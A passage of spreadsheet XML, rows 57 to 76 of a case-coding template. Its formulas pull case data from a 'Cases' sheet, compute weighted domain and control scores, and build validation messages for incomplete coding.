        <f>IF(AND(AI57&lt;&gt;"",AM57=""),1,0)</f>
        <v/>
      </c>
      <c r="AO57" s="14" t="n"/>
    </row>
    <row r="58">
      <c r="A58" s="11">
        <f>Cases!A58</f>
        <v/>
      </c>
      <c r="B58" s="11">
        <f>Cases!B58</f>
        <v/>
      </c>
      <c r="C58" s="11">
        <f>Cases!C58</f>
        <v/>
      </c>
      <c r="D58" s="11">
        <f>IF(Cases!F58="",LEFT(Cases!G58,120),Cases!F58)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E58:L58)=0,"",SUM(E58:L58))</f>
        <v/>
      </c>
      <c r="AJ58" s="13">
        <f>IF(AI58="","",N(E58)*3+N(F58)*2+N(G58)*2+N(H58)*2+N(I58)*2+N(J58)*3+N(K58)*3+N(L58)*3)</f>
        <v/>
      </c>
      <c r="AK58" s="13">
        <f>IF(AI58="","",COUNTIF(N58:AG58,1))</f>
        <v/>
      </c>
      <c r="AL58" s="13">
        <f>IF(OR(AJ58="",AJ58=0),"",ROUND(100*(AJ58-AK58)/AJ58,1))</f>
        <v/>
      </c>
      <c r="AM58" s="11">
        <f>IF(AI58="","",IF(AI58=0,"No domain coded 1; ","")&amp;IF(M58="","Primary domain missing; ",IF(IFERROR(INDEX(E58:L58,1,M58),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N58:AG58)&lt;&gt;AJ58,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH58="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN58" s="13">
        <f>IF(AND(AI58&lt;&gt;"",AM58=""),1,0)</f>
        <v/>
      </c>
      <c r="AO58" s="14" t="n"/>
    </row>
    <row r="59">
      <c r="A59" s="11">
        <f>Cases!A59</f>
        <v/>
      </c>
      <c r="B59" s="11">
        <f>Cases!B59</f>
        <v/>
      </c>
      <c r="C59" s="11">
        <f>Cases!C59</f>
        <v/>
      </c>
      <c r="D59" s="11">
        <f>IF(Cases!F59="",LEFT(Cases!G59,120),Cases!F59)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E59:L59)=0,"",SUM(E59:L59))</f>
        <v/>
      </c>
      <c r="AJ59" s="13">
        <f>IF(AI59="","",N(E59)*3+N(F59)*2+N(G59)*2+N(H59)*2+N(I59)*2+N(J59)*3+N(K59)*3+N(L59)*3)</f>
        <v/>
      </c>
      <c r="AK59" s="13">
        <f>IF(AI59="","",COUNTIF(N59:AG59,1))</f>
        <v/>
      </c>
      <c r="AL59" s="13">
        <f>IF(OR(AJ59="",AJ59=0),"",ROUND(100*(AJ59-AK59)/AJ59,1))</f>
        <v/>
      </c>
      <c r="AM59" s="11">
        <f>IF(AI59="","",IF(AI59=0,"No domain coded 1; ","")&amp;IF(M59="","Primary domain missing; ",IF(IFERROR(INDEX(E59:L59,1,M59),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N59:AG59)&lt;&gt;AJ59,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH59="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN59" s="13">
        <f>IF(AND(AI59&lt;&gt;"",AM59=""),1,0)</f>
        <v/>
      </c>
      <c r="AO59" s="14" t="n"/>
    </row>
    <row r="60">
      <c r="A60" s="11">
        <f>Cases!A60</f>
        <v/>
      </c>
      <c r="B60" s="11">
        <f>Cases!B60</f>
        <v/>
      </c>
      <c r="C60" s="11">
        <f>Cases!C60</f>
        <v/>
      </c>
      <c r="D60" s="11">
        <f>IF(Cases!F60="",LEFT(Cases!G60,120),Cases!F60)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E60:L60)=0,"",SUM(E60:L60))</f>
        <v/>
      </c>
      <c r="AJ60" s="13">
        <f>IF(AI60="","",N(E60)*3+N(F60)*2+N(G60)*2+N(H60)*2+N(I60)*2+N(J60)*3+N(K60)*3+N(L60)*3)</f>
        <v/>
      </c>
      <c r="AK60" s="13">
        <f>IF(AI60="","",COUNTIF(N60:AG60,1))</f>
        <v/>
      </c>
      <c r="AL60" s="13">
        <f>IF(OR(AJ60="",AJ60=0),"",ROUND(100*(AJ60-AK60)/AJ60,1))</f>
        <v/>
      </c>
      <c r="AM60" s="11">
        <f>IF(AI60="","",IF(AI60=0,"No domain coded 1; ","")&amp;IF(M60="","Primary domain missing; ",IF(IFERROR(INDEX(E60:L60,1,M60),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N60:AG60)&lt;&gt;AJ60,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH60="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN60" s="13">
        <f>IF(AND(AI60&lt;&gt;"",AM60=""),1,0)</f>
        <v/>
      </c>
      <c r="AO60" s="14" t="n"/>
    </row>
    <row r="61">
      <c r="A61" s="11">
        <f>Cases!A61</f>
        <v/>
      </c>
      <c r="B61" s="11">
        <f>Cases!B61</f>
        <v/>
      </c>
      <c r="C61" s="11">
        <f>Cases!C61</f>
        <v/>
      </c>
      <c r="D61" s="11">
        <f>IF(Cases!F61="",LEFT(Cases!G61,120),Cases!F61)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E61:L61)=0,"",SUM(E61:L61))</f>
        <v/>
      </c>
      <c r="AJ61" s="13">
        <f>IF(AI61="","",N(E61)*3+N(F61)*2+N(G61)*2+N(H61)*2+N(I61)*2+N(J61)*3+N(K61)*3+N(L61)*3)</f>
        <v/>
      </c>
      <c r="AK61" s="13">
        <f>IF(AI61="","",COUNTIF(N61:AG61,1))</f>
        <v/>
      </c>
      <c r="AL61" s="13">
        <f>IF(OR(AJ61="",AJ61=0),"",ROUND(100*(AJ61-AK61)/AJ61,1))</f>
        <v/>
      </c>
      <c r="AM61" s="11">
        <f>IF(AI61="","",IF(AI61=0,"No domain coded 1; ","")&amp;IF(M61="","Primary domain missing; ",IF(IFERROR(INDEX(E61:L61,1,M61),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N61:AG61)&lt;&gt;AJ61,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH61="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN61" s="13">
        <f>IF(AND(AI61&lt;&gt;"",AM61=""),1,0)</f>
        <v/>
      </c>
      <c r="AO61" s="14" t="n"/>
    </row>
    <row r="62">
      <c r="A62" s="11">
        <f>Cases!A62</f>
        <v/>
      </c>
      <c r="B62" s="11">
        <f>Cases!B62</f>
        <v/>
      </c>
      <c r="C62" s="11">
        <f>Cases!C62</f>
        <v/>
      </c>
      <c r="D62" s="11">
        <f>IF(Cases!F62="",LEFT(Cases!G62,120),Cases!F62)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E62:L62)=0,"",SUM(E62:L62))</f>
        <v/>
      </c>
      <c r="AJ62" s="13">
        <f>IF(AI62="","",N(E62)*3+N(F62)*2+N(G62)*2+N(H62)*2+N(I62)*2+N(J62)*3+N(K62)*3+N(L62)*3)</f>
        <v/>
      </c>
      <c r="AK62" s="13">
        <f>IF(AI62="","",COUNTIF(N62:AG62,1))</f>
        <v/>
      </c>
      <c r="AL62" s="13">
        <f>IF(OR(AJ62="",AJ62=0),"",ROUND(100*(AJ62-AK62)/AJ62,1))</f>
        <v/>
      </c>
      <c r="AM62" s="11">
        <f>IF(AI62="","",IF(AI62=0,"No domain coded 1; ","")&amp;IF(M62="","Primary domain missing; ",IF(IFERROR(INDEX(E62:L62,1,M62),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N62:AG62)&lt;&gt;AJ62,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH62="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN62" s="13">
        <f>IF(AND(AI62&lt;&gt;"",AM62=""),1,0)</f>
        <v/>
      </c>
      <c r="AO62" s="14" t="n"/>
    </row>
    <row r="63">
      <c r="A63" s="11">
        <f>Cases!A63</f>
        <v/>
      </c>
      <c r="B63" s="11">
        <f>Cases!B63</f>
        <v/>
      </c>
      <c r="C63" s="11">
        <f>Cases!C63</f>
        <v/>
      </c>
      <c r="D63" s="11">
        <f>IF(Cases!F63="",LEFT(Cases!G63,120),Cases!F63)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E63:L63)=0,"",SUM(E63:L63))</f>
        <v/>
      </c>
      <c r="AJ63" s="13">
        <f>IF(AI63="","",N(E63)*3+N(F63)*2+N(G63)*2+N(H63)*2+N(I63)*2+N(J63)*3+N(K63)*3+N(L63)*3)</f>
        <v/>
      </c>
      <c r="AK63" s="13">
        <f>IF(AI63="","",COUNTIF(N63:AG63,1))</f>
        <v/>
      </c>
      <c r="AL63" s="13">
        <f>IF(OR(AJ63="",AJ63=0),"",ROUND(100*(AJ63-AK63)/AJ63,1))</f>
        <v/>
      </c>
      <c r="AM63" s="11">
        <f>IF(AI63="","",IF(AI63=0,"No domain coded 1; ","")&amp;IF(M63="","Primary domain missing; ",IF(IFERROR(INDEX(E63:L63,1,M63),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N63:AG63)&lt;&gt;AJ63,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH63="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN63" s="13">
        <f>IF(AND(AI63&lt;&gt;"",AM63=""),1,0)</f>
        <v/>
      </c>
      <c r="AO63" s="14" t="n"/>
    </row>
    <row r="64">
      <c r="A64" s="11">
        <f>Cases!A64</f>
        <v/>
      </c>
      <c r="B64" s="11">
        <f>Cases!B64</f>
        <v/>
      </c>
      <c r="C64" s="11">
        <f>Cases!C64</f>
        <v/>
      </c>
      <c r="D64" s="11">
        <f>IF(Cases!F64="",LEFT(Cases!G64,120),Cases!F64)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E64:L64)=0,"",SUM(E64:L64))</f>
        <v/>
      </c>
      <c r="AJ64" s="13">
        <f>IF(AI64="","",N(E64)*3+N(F64)*2+N(G64)*2+N(H64)*2+N(I64)*2+N(J64)*3+N(K64)*3+N(L64)*3)</f>
        <v/>
      </c>
      <c r="AK64" s="13">
        <f>IF(AI64="","",COUNTIF(N64:AG64,1))</f>
        <v/>
      </c>
      <c r="AL64" s="13">
        <f>IF(OR(AJ64="",AJ64=0),"",ROUND(100*(AJ64-AK64)/AJ64,1))</f>
        <v/>
      </c>
      <c r="AM64" s="11">
        <f>IF(AI64="","",IF(AI64=0,"No domain coded 1; ","")&amp;IF(M64="","Primary domain missing; ",IF(IFERROR(INDEX(E64:L64,1,M64),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N64:AG64)&lt;&gt;AJ64,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH64="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN64" s="13">
        <f>IF(AND(AI64&lt;&gt;"",AM64=""),1,0)</f>
        <v/>
      </c>
      <c r="AO64" s="14" t="n"/>
    </row>
    <row r="65">
      <c r="A65" s="11">
        <f>Cases!A65</f>
        <v/>
      </c>
      <c r="B65" s="11">
        <f>Cases!B65</f>
        <v/>
      </c>
      <c r="C65" s="11">
        <f>Cases!C65</f>
        <v/>
      </c>
      <c r="D65" s="11">
        <f>IF(Cases!F65="",LEFT(Cases!G65,120),Cases!F65)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E65:L65)=0,"",SUM(E65:L65))</f>
        <v/>
      </c>
      <c r="AJ65" s="13">
        <f>IF(AI65="","",N(E65)*3+N(F65)*2+N(G65)*2+N(H65)*2+N(I65)*2+N(J65)*3+N(K65)*3+N(L65)*3)</f>
        <v/>
      </c>
      <c r="AK65" s="13">
        <f>IF(AI65="","",COUNTIF(N65:AG65,1))</f>
        <v/>
      </c>
      <c r="AL65" s="13">
        <f>IF(OR(AJ65="",AJ65=0),"",ROUND(100*(AJ65-AK65)/AJ65,1))</f>
        <v/>
      </c>
      <c r="AM65" s="11">
        <f>IF(AI65="","",IF(AI65=0,"No domain coded 1; ","")&amp;IF(M65="","Primary domain missing; ",IF(IFERROR(INDEX(E65:L65,1,M65),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N65:AG65)&lt;&gt;AJ65,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH65="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN65" s="13">
        <f>IF(AND(AI65&lt;&gt;"",AM65=""),1,0)</f>
        <v/>
      </c>
      <c r="AO65" s="14" t="n"/>
    </row>
    <row r="66">
      <c r="A66" s="11">
        <f>Cases!A66</f>
        <v/>
      </c>
      <c r="B66" s="11">
        <f>Cases!B66</f>
        <v/>
      </c>
      <c r="C66" s="11">
        <f>Cases!C66</f>
        <v/>
      </c>
      <c r="D66" s="11">
        <f>IF(Cases!F66="",LEFT(Cases!G66,120),Cases!F66)</f>
        <v/>
      </c>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12" t="n"/>
      <c r="AI66" s="13">
        <f>IF(COUNT(E66:L66)=0,"",SUM(E66:L66))</f>
        <v/>
      </c>
      <c r="AJ66" s="13">
        <f>IF(AI66="","",N(E66)*3+N(F66)*2+N(G66)*2+N(H66)*2+N(I66)*2+N(J66)*3+N(K66)*3+N(L66)*3)</f>
        <v/>
      </c>
      <c r="AK66" s="13">
        <f>IF(AI66="","",COUNTIF(N66:AG66,1))</f>
        <v/>
      </c>
      <c r="AL66" s="13">
        <f>IF(OR(AJ66="",AJ66=0),"",ROUND(100*(AJ66-AK66)/AJ66,1))</f>
        <v/>
      </c>
      <c r="AM66" s="11">
        <f>IF(AI66="","",IF(AI66=0,"No domain coded 1; ","")&amp;IF(M66="","Primary domain missing; ",IF(IFERROR(INDEX(E66:L66,1,M66),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N66:AG66)&lt;&gt;AJ66,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH66="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN66" s="13">
        <f>IF(AND(AI66&lt;&gt;"",AM66=""),1,0)</f>
        <v/>
      </c>
      <c r="AO66" s="14" t="n"/>
    </row>
    <row r="67">
      <c r="A67" s="11">
        <f>Cases!A67</f>
        <v/>
      </c>
      <c r="B67" s="11">
        <f>Cases!B67</f>
        <v/>
      </c>
      <c r="C67" s="11">
        <f>Cases!C67</f>
        <v/>
      </c>
      <c r="D67" s="11">
        <f>IF(Cases!F67="",LEFT(Cases!G67,120),Cases!F67)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E67:L67)=0,"",SUM(E67:L67))</f>
        <v/>
      </c>
      <c r="AJ67" s="13">
        <f>IF(AI67="","",N(E67)*3+N(F67)*2+N(G67)*2+N(H67)*2+N(I67)*2+N(J67)*3+N(K67)*3+N(L67)*3)</f>
        <v/>
      </c>
      <c r="AK67" s="13">
        <f>IF(AI67="","",COUNTIF(N67:AG67,1))</f>
        <v/>
      </c>
      <c r="AL67" s="13">
        <f>IF(OR(AJ67="",AJ67=0),"",ROUND(100*(AJ67-AK67)/AJ67,1))</f>
        <v/>
      </c>
      <c r="AM67" s="11">
        <f>IF(AI67="","",IF(AI67=0,"No domain coded 1; ","")&amp;IF(M67="","Primary domain missing; ",IF(IFERROR(INDEX(E67:L67,1,M67),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N67:AG67)&lt;&gt;AJ67,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH67="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN67" s="13">
        <f>IF(AND(AI67&lt;&gt;"",AM67=""),1,0)</f>
        <v/>
      </c>
      <c r="AO67" s="14" t="n"/>
    </row>
    <row r="68">
      <c r="A68" s="11">
        <f>Cases!A68</f>
        <v/>
      </c>
      <c r="B68" s="11">
        <f>Cases!B68</f>
        <v/>
      </c>
      <c r="C68" s="11">
        <f>Cases!C68</f>
        <v/>
      </c>
      <c r="D68" s="11">
        <f>IF(Cases!F68="",LEFT(Cases!G68,120),Cases!F68)</f>
        <v/>
      </c>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12" t="n"/>
      <c r="AI68" s="13">
        <f>IF(COUNT(E68:L68)=0,"",SUM(E68:L68))</f>
        <v/>
      </c>
      <c r="AJ68" s="13">
        <f>IF(AI68="","",N(E68)*3+N(F68)*2+N(G68)*2+N(H68)*2+N(I68)*2+N(J68)*3+N(K68)*3+N(L68)*3)</f>
        <v/>
      </c>
      <c r="AK68" s="13">
        <f>IF(AI68="","",COUNTIF(N68:AG68,1))</f>
        <v/>
      </c>
      <c r="AL68" s="13">
        <f>IF(OR(AJ68="",AJ68=0),"",ROUND(100*(AJ68-AK68)/AJ68,1))</f>
        <v/>
      </c>
      <c r="AM68" s="11">
        <f>IF(AI68="","",IF(AI68=0,"No domain coded 1; ","")&amp;IF(M68="","Primary domain missing; ",IF(IFERROR(INDEX(E68:L68,1,M68),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N68:AG68)&lt;&gt;AJ68,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH68="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN68" s="13">
        <f>IF(AND(AI68&lt;&gt;"",AM68=""),1,0)</f>
        <v/>
      </c>
      <c r="AO68" s="14" t="n"/>
    </row>
    <row r="69">
      <c r="A69" s="11">
        <f>Cases!A69</f>
        <v/>
      </c>
      <c r="B69" s="11">
        <f>Cases!B69</f>
        <v/>
      </c>
      <c r="C69" s="11">
        <f>Cases!C69</f>
        <v/>
      </c>
      <c r="D69" s="11">
        <f>IF(Cases!F69="",LEFT(Cases!G69,120),Cases!F69)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E69:L69)=0,"",SUM(E69:L69))</f>
        <v/>
      </c>
      <c r="AJ69" s="13">
        <f>IF(AI69="","",N(E69)*3+N(F69)*2+N(G69)*2+N(H69)*2+N(I69)*2+N(J69)*3+N(K69)*3+N(L69)*3)</f>
        <v/>
      </c>
      <c r="AK69" s="13">
        <f>IF(AI69="","",COUNTIF(N69:AG69,1))</f>
        <v/>
      </c>
      <c r="AL69" s="13">
        <f>IF(OR(AJ69="",AJ69=0),"",ROUND(100*(AJ69-AK69)/AJ69,1))</f>
        <v/>
      </c>
      <c r="AM69" s="11">
        <f>IF(AI69="","",IF(AI69=0,"No domain coded 1; ","")&amp;IF(M69="","Primary domain missing; ",IF(IFERROR(INDEX(E69:L69,1,M69),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N69:AG69)&lt;&gt;AJ69,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH69="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN69" s="13">
        <f>IF(AND(AI69&lt;&gt;"",AM69=""),1,0)</f>
        <v/>
      </c>
      <c r="AO69" s="14" t="n"/>
    </row>
    <row r="70">
      <c r="A70" s="11">
        <f>Cases!A70</f>
        <v/>
      </c>
      <c r="B70" s="11">
        <f>Cases!B70</f>
        <v/>
      </c>
      <c r="C70" s="11">
        <f>Cases!C70</f>
        <v/>
      </c>
      <c r="D70" s="11">
        <f>IF(Cases!F70="",LEFT(Cases!G70,120),Cases!F70)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E70:L70)=0,"",SUM(E70:L70))</f>
        <v/>
      </c>
      <c r="AJ70" s="13">
        <f>IF(AI70="","",N(E70)*3+N(F70)*2+N(G70)*2+N(H70)*2+N(I70)*2+N(J70)*3+N(K70)*3+N(L70)*3)</f>
        <v/>
      </c>
      <c r="AK70" s="13">
        <f>IF(AI70="","",COUNTIF(N70:AG70,1))</f>
        <v/>
      </c>
      <c r="AL70" s="13">
        <f>IF(OR(AJ70="",AJ70=0),"",ROUND(100*(AJ70-AK70)/AJ70,1))</f>
        <v/>
      </c>
      <c r="AM70" s="11">
        <f>IF(AI70="","",IF(AI70=0,"No domain coded 1; ","")&amp;IF(M70="","Primary domain missing; ",IF(IFERROR(INDEX(E70:L70,1,M70),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N70:AG70)&lt;&gt;AJ70,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH70="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN70" s="13">
        <f>IF(AND(AI70&lt;&gt;"",AM70=""),1,0)</f>
        <v/>
      </c>
      <c r="AO70" s="14" t="n"/>
    </row>
    <row r="71">
      <c r="A71" s="11">
        <f>Cases!A71</f>
        <v/>
      </c>
      <c r="B71" s="11">
        <f>Cases!B71</f>
        <v/>
      </c>
      <c r="C71" s="11">
        <f>Cases!C71</f>
        <v/>
      </c>
      <c r="D71" s="11">
        <f>IF(Cases!F71="",LEFT(Cases!G71,120),Cases!F71)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E71:L71)=0,"",SUM(E71:L71))</f>
        <v/>
      </c>
      <c r="AJ71" s="13">
        <f>IF(AI71="","",N(E71)*3+N(F71)*2+N(G71)*2+N(H71)*2+N(I71)*2+N(J71)*3+N(K71)*3+N(L71)*3)</f>
        <v/>
      </c>
      <c r="AK71" s="13">
        <f>IF(AI71="","",COUNTIF(N71:AG71,1))</f>
        <v/>
      </c>
      <c r="AL71" s="13">
        <f>IF(OR(AJ71="",AJ71=0),"",ROUND(100*(AJ71-AK71)/AJ71,1))</f>
        <v/>
      </c>
      <c r="AM71" s="11">
        <f>IF(AI71="","",IF(AI71=0,"No domain coded 1; ","")&amp;IF(M71="","Primary domain missing; ",IF(IFERROR(INDEX(E71:L71,1,M71),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N71:AG71)&lt;&gt;AJ71,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH71="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN71" s="13">
        <f>IF(AND(AI71&lt;&gt;"",AM71=""),1,0)</f>
        <v/>
      </c>
      <c r="AO71" s="14" t="n"/>
    </row>
    <row r="72">
      <c r="A72" s="11">
        <f>Cases!A72</f>
        <v/>
      </c>
      <c r="B72" s="11">
        <f>Cases!B72</f>
        <v/>
      </c>
      <c r="C72" s="11">
        <f>Cases!C72</f>
        <v/>
      </c>
      <c r="D72" s="11">
        <f>IF(Cases!F72="",LEFT(Cases!G72,120),Cases!F72)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E72:L72)=0,"",SUM(E72:L72))</f>
        <v/>
      </c>
      <c r="AJ72" s="13">
        <f>IF(AI72="","",N(E72)*3+N(F72)*2+N(G72)*2+N(H72)*2+N(I72)*2+N(J72)*3+N(K72)*3+N(L72)*3)</f>
        <v/>
      </c>
      <c r="AK72" s="13">
        <f>IF(AI72="","",COUNTIF(N72:AG72,1))</f>
        <v/>
      </c>
      <c r="AL72" s="13">
        <f>IF(OR(AJ72="",AJ72=0),"",ROUND(100*(AJ72-AK72)/AJ72,1))</f>
        <v/>
      </c>
      <c r="AM72" s="11">
        <f>IF(AI72="","",IF(AI72=0,"No domain coded 1; ","")&amp;IF(M72="","Primary domain missing; ",IF(IFERROR(INDEX(E72:L72,1,M72),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N72:AG72)&lt;&gt;AJ72,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH72="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN72" s="13">
        <f>IF(AND(AI72&lt;&gt;"",AM72=""),1,0)</f>
        <v/>
      </c>
      <c r="AO72" s="14" t="n"/>
    </row>
    <row r="73">
      <c r="A73" s="11">
        <f>Cases!A73</f>
        <v/>
      </c>
      <c r="B73" s="11">
        <f>Cases!B73</f>
        <v/>
      </c>
      <c r="C73" s="11">
        <f>Cases!C73</f>
        <v/>
      </c>
      <c r="D73" s="11">
        <f>IF(Cases!F73="",LEFT(Cases!G73,120),Cases!F73)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E73:L73)=0,"",SUM(E73:L73))</f>
        <v/>
      </c>
      <c r="AJ73" s="13">
        <f>IF(AI73="","",N(E73)*3+N(F73)*2+N(G73)*2+N(H73)*2+N(I73)*2+N(J73)*3+N(K73)*3+N(L73)*3)</f>
        <v/>
      </c>
      <c r="AK73" s="13">
        <f>IF(AI73="","",COUNTIF(N73:AG73,1))</f>
        <v/>
      </c>
      <c r="AL73" s="13">
        <f>IF(OR(AJ73="",AJ73=0),"",ROUND(100*(AJ73-AK73)/AJ73,1))</f>
        <v/>
      </c>
      <c r="AM73" s="11">
        <f>IF(AI73="","",IF(AI73=0,"No domain coded 1; ","")&amp;IF(M73="","Primary domain missing; ",IF(IFERROR(INDEX(E73:L73,1,M73),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N73:AG73)&lt;&gt;AJ73,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH73="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN73" s="13">
        <f>IF(AND(AI73&lt;&gt;"",AM73=""),1,0)</f>
        <v/>
      </c>
      <c r="AO73" s="14" t="n"/>
    </row>
    <row r="74">
      <c r="A74" s="11">
        <f>Cases!A74</f>
        <v/>
      </c>
      <c r="B74" s="11">
        <f>Cases!B74</f>
        <v/>
      </c>
      <c r="C74" s="11">
        <f>Cases!C74</f>
        <v/>
      </c>
      <c r="D74" s="11">
        <f>IF(Cases!F74="",LEFT(Cases!G74,120),Cases!F74)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E74:L74)=0,"",SUM(E74:L74))</f>
        <v/>
      </c>
      <c r="AJ74" s="13">
        <f>IF(AI74="","",N(E74)*3+N(F74)*2+N(G74)*2+N(H74)*2+N(I74)*2+N(J74)*3+N(K74)*3+N(L74)*3)</f>
        <v/>
      </c>
      <c r="AK74" s="13">
        <f>IF(AI74="","",COUNTIF(N74:AG74,1))</f>
        <v/>
      </c>
      <c r="AL74" s="13">
        <f>IF(OR(AJ74="",AJ74=0),"",ROUND(100*(AJ74-AK74)/AJ74,1))</f>
        <v/>
      </c>
      <c r="AM74" s="11">
        <f>IF(AI74="","",IF(AI74=0,"No domain coded 1; ","")&amp;IF(M74="","Primary domain missing; ",IF(IFERROR(INDEX(E74:L74,1,M74),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N74:AG74)&lt;&gt;AJ74,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH74="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN74" s="13">
        <f>IF(AND(AI74&lt;&gt;"",AM74=""),1,0)</f>
        <v/>
      </c>
      <c r="AO74" s="14" t="n"/>
    </row>
    <row r="75">
      <c r="A75" s="11">
        <f>Cases!A75</f>
        <v/>
      </c>
      <c r="B75" s="11">
        <f>Cases!B75</f>
        <v/>
      </c>
      <c r="C75" s="11">
        <f>Cases!C75</f>
        <v/>
      </c>
      <c r="D75" s="11">
        <f>IF(Cases!F75="",LEFT(Cases!G75,120),Cases!F75)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E75:L75)=0,"",SUM(E75:L75))</f>
        <v/>
      </c>
      <c r="AJ75" s="13">
        <f>IF(AI75="","",N(E75)*3+N(F75)*2+N(G75)*2+N(H75)*2+N(I75)*2+N(J75)*3+N(K75)*3+N(L75)*3)</f>
        <v/>
      </c>
      <c r="AK75" s="13">
        <f>IF(AI75="","",COUNTIF(N75:AG75,1))</f>
        <v/>
      </c>
      <c r="AL75" s="13">
        <f>IF(OR(AJ75="",AJ75=0),"",ROUND(100*(AJ75-AK75)/AJ75,1))</f>
        <v/>
      </c>
      <c r="AM75" s="11">
        <f>IF(AI75="","",IF(AI75=0,"No domain coded 1; ","")&amp;IF(M75="","Primary domain missing; ",IF(IFERROR(INDEX(E75:L75,1,M75),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N75:AG75)&lt;&gt;AJ75,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH75="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN75" s="13">
        <f>IF(AND(AI75&lt;&gt;"",AM75=""),1,0)</f>
        <v/>
      </c>
      <c r="AO75" s="14" t="n"/>
    </row>
    <row r="76">
      <c r="A76" s="11">
        <f>Cases!A76</f>
        <v/>
      </c>
      <c r="B76" s="11">
        <f>Cases!B76</f>
        <v/>
      </c>
      <c r="C76" s="11">
        <f>Cases!C76</f>
        <v/>
      </c>
      <c r="D76" s="11">
        <f>IF(Cases!F76="",LEFT(Cases!G76,120),Cases!F76)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E76:L76)=0,"",SUM(E76:L76))</f>
        <v/>
      </c>
      <c r="AJ76" s="13">
        <f>IF(AI76="","",N(E76)*3+N(F76)*2+N(G76)*2+N(H76)*2+N(I76)*2+N(J76)*3+N(K76)*3+N(L76)*3)</f>
        <v/>
      </c>
      <c r="AK76" s="13">
        <f>IF(AI76="","",COUNTIF(N76:AG76,1))</f>
        <v/>
      </c>
      <c r="AL76" s="13">
        <f>IF(OR(AJ76="",AJ76=0),"",ROUND(100*(AJ76-AK76)/AJ76,1))</f>
        <v/>
      </c>
      <c r="AM76" s="11">
